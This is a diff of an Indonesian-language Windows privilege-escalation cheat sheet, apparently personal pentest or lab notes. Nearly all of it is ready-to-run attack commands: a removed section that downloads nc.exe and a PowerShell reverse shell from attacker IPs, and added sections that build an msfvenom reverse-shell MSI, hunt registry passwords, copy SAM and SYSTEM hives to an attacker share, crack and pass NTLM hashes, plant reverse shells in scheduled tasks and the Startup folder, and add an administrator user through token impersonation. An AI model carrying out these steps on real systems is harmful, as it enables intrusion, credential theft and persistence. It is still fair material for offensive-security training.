@@ -1,44 +1,3 @@
-## Check System Info --
-~# systeminfo
-
-## Download File From CMD (Not PowerShell) -- 
-certutil.exe -urlcache -split -f "http://10.14.17.16:4545/nc.exe" %tmp%\nc.exe
-
-### Reverse Shell
-%tmp%\nc.exe IP PORT -e cmd
-
-## Download File From PowerShell) -- 
-
-(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
-
-## Reverse Shell With Nishang To Get Powershell --
-
-## Windows  Exploit Suggester --
-
-##Run Nishang As Administrator to get root! -- 
-We must get low shell with nishang. Then run this command
-
-Requirement : SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
-
-Check : whoami /all
-PRIVILEGES INFORMATION                                                                                                                                                                                                            [319/687]
-----------------------                                                                                                                                                                                                                     
-                                                                                                                                                                                                                                           
-Privilege Name                Description                          State                                                                                                                                                                   
-============================= ==================================== ========                                                                                                                                                                
-SeShutdownPrivilege           Shut down the system                 Disabled                                                                                                                                                                
-SeChangeNotifyPrivilege       Bypass traverse checking             Enabled  <<---                                                                                                                                                            
-SeUndockPrivilege             Remove computer from docking station Disabled                                                                                                                                                                
-SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled                                                                                                                                                                
-SeTimeZonePrivilege           Change the time zone                 Disabled 
-
-Then run this command
-$SecPass = ConvertTo-SecureString -AsPlainText -Force 'Welcome1!' 
-$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)
-Start-Process -Filepath "powershell" -argumentlist "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.29/Invoke-PowershellTcp.ps1')" -Credential $cred
-
-============================================
-
 # Windows Privilege Escalation
 
 ## Insecure Service Permissions
@@ -56,7 +15,7 @@ Terdapat beberapa celah service misconfiguration yang dapat menyebabkan Privileg
 ### Insecure Service Properties
 Setiap service memiliki Access Control (ACL) tentang siapa yang berhak mengakses service tersebut seperi Start/Stop, mengubah konfigurasi dll. Jika low user memiliki hak akses untuk merubah konfigurasi dari service yang dijalankan dengan privilege SYSTEM, maka kita bisa mengganti service tersebut dengan milik kita dengan merubah konfig. Namun kalau kita bisa ganti tapi gak bisa start/stop, maka kemungkinan tidak bisa di escalate.
 
--- RECON --
+#### RECON
 
 Menggunakan WINPEAS untuk mencari informasi service yang terdapat pada windows
 ```
@@ -449,22 +408,327 @@ Lalu copy file `reverse.exe` ke direktori `C:\Program Files\Autorun Program` dan
 
 Lalu restart windows
 
+### AlwaysInstallElevated
+File berformat MSI adalah sebuah package yang digunakan untuk install aplikasi. File ini dijalankan dengan permission sesuai dengan user yang menjalankan. Windows mengizinkan installer ini untuk dijalakan dengan user administrator. Artinya kita bisa membuat malicious MSI yang berfungsi untuk reverse shell.
+
+Hal yang perlu diperhatikan untuk mengetahui celah ini adalah melalui registry, kita harus memastikan bahwa konfigurasi `AlwaysInstallElevated` yang terdapat pada:
+`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` dan `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` bernilai 1, jika registry ini disabled dan bernilai 0 maka expoit tidak akan bekerja
+
+#### Recon
+```
+winPEASany.exe quiet windowscreds
+```
+Yang perlu diperhatikan dari output winpeas adalah sebagai berikut :
+```
+ [+] Checking AlwaysInstallElevated(T1012)
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+```
+Yang artinya `AlwaysInstallElevated` enabled dan kita bisa menjalankan exploit MSI. Untuk melakukan verifikasi, kita bisa gunakan command 
+
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+dan 
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+Hasilnya
+```
+AlwaysInstallElevated    REG_DWORD    0x1
+```
+
+`0x1` merupakan nilai hexa yang jika dikonversi ke desimal adalah 1
+Oke, selanjutnya kita buat file malicious MSI yang berisi reverse shell
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4545 -f msi -o reverse.msi
+```
+Lalu upload ke Windows target dan install aplikasi tersebut menggunakan privilege admin. 
+```
+msiexec /quiet /qn /i reverse.msi
+```
+Jangan lupa jalankan listener di attacker machine agar bisa menerima koneksi dari target. 
+
+## Passwords
+Terkadang admin menyimpan password di direktori tertentu, kita harus nyari manual disini. 
+
+Ada lagi password yang disimpan pada WIndows registry cara untuk mencari password di registry adalah 
+```
+reg query HKLM /f password /t REG_SZ /s
+
+atau 
+
+reg query HKCU /f password /t REG_SZ /s
+```
+
+terkadang banyak hasilnya, coba saring lagi. 
+
+#### Recon
+```
+winPEASany.exe quiet filesinfo userinfo
+```
+Hasilnya akan sangat banyak , contohnya winpeas akan mencari user autologon :
+
+```
+[+] Looking for AutoLogon credentials(T1012)
+    Some AutoLogon credentials were found!!
+    DefaultUserName               :  admin
+    DefaultPassword               :  password123
+
+```
+
+ada juga putty session
+```
++] Putty Sessions()
+    SessionName: BWP123F42
+    ProxyPassword: password123
+    ProxyUsername: admin
+
+```
+
+Untuk melakukan verifikasi terkait user autologoun kita bisa gunakan command berikut :
+```
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+```
+Pada kali linux kita bisa menggunakan `winexe` untuk mendapatkan akses shell dari target
+```
+winexe -U 'admin%password123' //192.168.1.9 cmd.exe
+```
+Untuk menjalankan winexe agar bisa masuk ke privilege SYSTEM (Admin) gunakan perintah
+```
+winexe -U 'admin%password123' --system //192.168.1.7 cmd.exe
+```
+
+### Saved Creds
+Pada windows terdapat perintah `runas` dimana kita bisa menjalankan program dengan privilege user lain misalnya admin. Biasanya hal ini membutuhkan password user lain agar bisa dijalankan oleh user kita saat ini. 
+
+Nah, Windows mengizinkan user untuk menyimpan credentials pada system yang disebut dengan Saved Creds, Saved Creds inilah yang bisa kita gunakan untuk melakukan bypass, sehingga kita tidak perlu mengetahui password untuk menjalankan suatu perintah/aplikasi/program dengan privilege user lain. 
+
+#### Recon
+```
+winPEASany.exe quiet cmd windowscreds
+```
+Hasilnya
+```
+  [+] Checking Credential manager()
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+
+Currently stored credentials:
+
+    Target: MicrosoftAccount:target=SSO_POP_Device
+    Type: Generic 
+    User: 02tzrympzjqpdvtu
+    Saved for this logon only
+    
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic 
+    User: 02tzrympzjqpdvtu
+    Local machine persistence
+    
+    Target: Domain:interactive=DESKTOP-FHFUEUQ\admin
+    Type: Domain Password
+    User: DESKTOP-FHFUEUQ\admin
+
+```
+
+Terdapat Saved Creds Admin. Kita bisa verifikasi manual dengan cara 
+```
+cmdkey /list
+```
+Dari hasil ini kita bisa menjalankan file reverse shell dengan user sebagai admin
+```
+runas /savecreds /user:admin C:\PrivEsc\rev.exe
+```
+
+### Configuration Files
+Terkadang administrators menyimpan file configurations pada sistem yang berisi password. 
+
+File Unattend.xml adalah contohnya, file ini bisa digunakan oleh admin untuk melakukan automated setup pada sistem windows
+
+#### Recon
+```
+winPEASany.exe quiet cmd searchfast filesinfo
+```
+Hasilnya
+```
+[+] Unnattend Files()
+    C:\Windows\Panther\Unattend.xml
+<Password>     
+```
+Selanjutnya kita lihat isi dari `Unattend.xml`
+```
+type C:\Windows\Panther\Unattend.xml
+```
+Dan cari password di dalamnya. 
+
+### SAM
+Windows menyimpan password hash dari semua user pada Security Account Manager (SAM). Hash yang disimpan terenkripsi dengan key yang disimpan ada file dengan nama `SYSTEM`. Jika kita memiliki hak akses untuk membaca file `SAM` dan `SYSTEM`, maka kita bisa extract hash lalu dump dengan menggunakaan SAMDUMP2
+
+File `SAM` dan `SYSTEM` tersimpan di `C:\Windows\System32\config`, namun file-file ini terkunci ketika windows sedang berjalan. 
+
+Kita bisa mencari apakah terdapat backup dari file-file ini pada direktori `C:\Windows\Repair` atau `C:\Windows\System32\config\RegBack`
+#### Recon
+```
+winPEASany.exe quiet cmd searchfast filesinfo
+```
+Hasilnya
+```
+[+] Looking for common SAM & SYSTEM backups()
+    C:\Windows\repair\SAM
+    C:\Windows\repair\SYSTEM
+```
+Copy file ini ke Kali Linux, jika SMB tersedia, gunakan perintah :
+```
+copy C:\Windows\repair\SAM \\192.168.1.8\tools\
+copy C:\Windows\repair\SYSTEM \\192.168.1.8\tools\
+```
+
+Lalu kita dump username dan hash menggunakan samdump2
+```
+samdump2 SYSTEM SAM
+```
+Hasilnya :
+```
+*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+MRDoel:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+admin:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+Crack hash NTLM menggunakan hashcat, target `admin:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`
+Command :
+```
+hashcat -m 1000 --force 31d6cfe0d16ae931b73c59d7e0c089c0 /usr/share/wordlists/rockyou.txt
+```
+
+Terkadang windows juga menerima login dengan hash, jadi kita gak perlu tau passwordnya. Kita bisa menggunakan tools `pth-winexe` untuk login, contohnya
+```
+pth-winexe -U 'admin@aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' //192.168.1.7 cmd.exe
+```
+
+Kalau belum login sebagai admin tambahkan paramter --system
+```
+pth-winexe --system -U 'admin@aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' //192.168.1.7 cmd.exe
+```
+
+
+## Scheduled Task
+Windows mengizinkan kita untuk melakukan penjadwalan task, sama seperti cron job di linux. Cara untuk mencari ini dengan manual. 
+
+contoh file schedules contoh nama filenya RunThis.ps1
+```
+# This script will clean up all your old dev logs every minute.
+# To avoid permissions issues, run as SYSTEM (should probably fix this later)
+
+Remove-Item C:\DevTools\*.log
+
+```
+
+Lalu cek permissionnya
+```
+accesschk.exe /accepteula -quv user RunThis.ps1
+```
+
+kalau ada WRITE berarti kita bisa masukkan perintah untuk menjalankan reverse shell
+```
+copy RunThis.ps1 C:\Temp\    #backup file
+echo C:\PrivEsc\reverse.exe >> RunThis.ps1 #copy path file to RunThis.ps1
+```
+Dan tunggu sampai windows mengeksekusi 
+
+## Insecure GUI Apps (Citrix Method)
+Pada versi windows yang lama, user bisa di granted untuk menjalanakn GUI apps dengan privilege administrator.
+
+Terdapat berbagai ceara untuk spawn command prompts (reverse shell) dari GUI apps, salah satunya menggunakan fungsi native Windows
+
+#### Recon
+```
+C:\DevTools>tasklist /V | findstr mspaint.exe
+tasklist /V | findstr mspaint.exe
+mspaint.exe                   1748 Console                    2     27.924 K Running         DESKTOP-FHFUEUQ\admin                                   0:00:00 Untitled - Paint 
+```
+Command diatas digunakan untuk melihat program dijalankan oleh siapa, dalam hal ini mspaint.exe dijalankan oleh admin. 
+
+Jika RDP tersedia, maka kita bisa buka mspaint.exe lalu open file cmd, maka kita akan membuka cmd sebagai administrator.
+
+![[insecureGui.PNG]]
+
+## Startup Apps
+Setiap user dapat menentukan aplikasi apa aja yang otomatis dijalankan ketika mereka login dengan cara menempatkan shortcut pada directory tertentu
+
+Windows secara default memiliki direktori untuk aplikasi yang akan dijalankan ketika startup, yaitu di `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`. Jika kita memiliki hak akses WRITABLE pada direktori ini kita bisa menyimpan reverse shell pada direktor tersebut yang akan dijalankan setiap kali startup. 
+
+#### Recon
+Kita cek apakah direktori Startup memiliki hak akses writable
+```
+accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+```
+Jika ada result `RW BUILTIN\Users` atau `RW Desktop\MyUser` artinya direktori tersebut writable. Jika ingin menempatkan aplikasi di direktori ini, maka harus berupa shortcut, gak bisa langsung `aplikasi.exe` cara untuk membuat shortcut ini bisa dengan vbscript
+
+Buat file dengan nama `CreateShortcut.vbs`, lalu paste kode berikut :
+```
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+```
+
+Yang perlu diperhatikan adalah `oLink.TargetPath`, yaitu path aplikasi yang kita miliki . Lalu jalankan script. 
+
+```
+cscript CreateShortcut.vbs
+```
+
+Tinggal menunggu restart dari administrator, maka secara otomatis file shortcut yang kita buat akan berjalan. 
+
+## Installed Applications
+Kita bisa exploit aplikasi yang terinstall di windows. Untuk mencari exploit priv esc bisa lihatdi exploit-db atau web lainnya. As soon as kita dapatkan exploitnya, maka kita bisa jalankan di windows. 
+
+#### Recon
+Melihat task yg sedang berjalan
+```
+tasklist /V
+```
+Terkadang ada aplikasi non-standard yang biasanya aplikasi ini memiliki celah keamanan. Untuk cek aplikasi non-standard,kita bisa gunakan tool seatbelt.exe
+```
+.\seatbelt.exe NonstandardProcesses
+```
+Kita juga bisa pakai winpeas
+```
+winPEASany.exe quiet processinfo
+```
+
+## Hot Potato
+```
+.\potato.exe -ip <ip_local_windows> cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+```
+
 ## Token Impersonate
 
 Windows menggunakan Token sebagai Identifier untuk setiap pengguna. Token ini di generate saat login. Ada celah keamanan dimana user biasa bisa melakukan priv esc bilamana user kita saat ini memiliki permission seDebugPrivilege dan SeImpersonatePrivilege
 
-Untuk cek apakah user bisa di impersonate cek di CMD :
-$ whoami /priv
-pastikan seDebugPrivilege dan SeImpersonatePrivilege enabled. 
+Untuk cek apakah user kita saat ini bisa impersonate token
+
+cek di CMD :
+`whoami /priv`
+
+pastikan  `SeImpersonatePrivilege` enabled. 
 
 Lalu cek user mana saja yang bisa di impersonate. Kita bisa pakai incognito.exe, commandnya :
 
+```
 * incognito.exe list tokens -u //list token available to impersonate
 * incognito.exe add_user mrdoel 123456 //add new user
 * incognito.exe add_localgroup_user Administrators mrdoel  //add new user to the local administrators group
 * net user mrdoel //cek apakah user sudah ditambahkan ke group administrator (Local Group Memberships      *Administrators)
+```
 
-Jika RDP tersedit maka kita bisa login sebagai root dengan command
+Jika RDP tersedia maka kita bisa login sebagai root dengan command
 `rdesktop -u mrdoel -p 123456 target.local`
 
 ### Teknik Baru Token Impersonate 
@@ -476,3 +740,26 @@ Cek di https://github.com/itm4n/PrintSpoofer/releases
 
 Perintah untuk menjalankan exploit
 ```PrintSpoofer64.exe -i -c cmd```
+
+### Juicy Potato
+Pada Windows terdapat user dengan privilege services. User ini tidak bisa login, karena dia hanya bertugas untuk menjalankan tugas / service misal apache, mssql dll. Terdapat celah keamanan ketika user service ini memiliki privileges `SeImpersonatePrivilege`  atau `SeAssignPrimaryToken`dimana bisa melakukan token impersonate. 
+
+Cara untuk exploit celah ini adalah dengan menggunakan Juice Potatal https://github.com/ohpe/juicy-potato  , juicy potato hanya work sampai windows 7. Sedangkan untuk windows 10 kita bisa gunakan Rogue Potato
+
+Cek dulu `whoami /priv`
+
+Lalu cara untuk menjalankan juicy potato
+```
+.\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {xxx}
+```
+
+Penjelasan
+* -l local port
+* -p program yang akan dijalankan
+* -t createprocess all
+* -c CLSID, adalah unique number untuk mengidentifikasi setiap komponen aplikasi di windows. cek disini https://github.com/ohpe/juicy-potato/tree/master/CLSID , sesuaikan dengan sistem operasi dan privilege. Misalnya Windows 7 dan privilege `NT AUTHORITY\SYSTEM` maka CLSID nya ``{03ca98d6-ff5d-49b8-abc6-03dd84127020}``
+
+```
+.\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+```
+
